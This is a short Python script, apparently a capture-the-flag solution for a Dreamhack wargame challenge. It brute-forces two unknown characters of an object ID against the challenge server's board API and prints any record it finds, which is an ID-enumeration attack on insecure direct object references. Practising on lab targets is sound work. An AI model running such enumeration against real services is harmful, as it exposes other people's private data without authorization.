import requests
import string

FOR = string.ascii_letters + string.digits

for i in FOR:
    for j in FOR:
        req = f"62db726{i}e1ee230f525c196{j}"
        res = requests.get(f"http://host3.dreamhack.games:21979/api/board/{req}")
        # print(f'{req} : {res.status_code}')
        if res.status_code == 200:
            print(res.text)
            break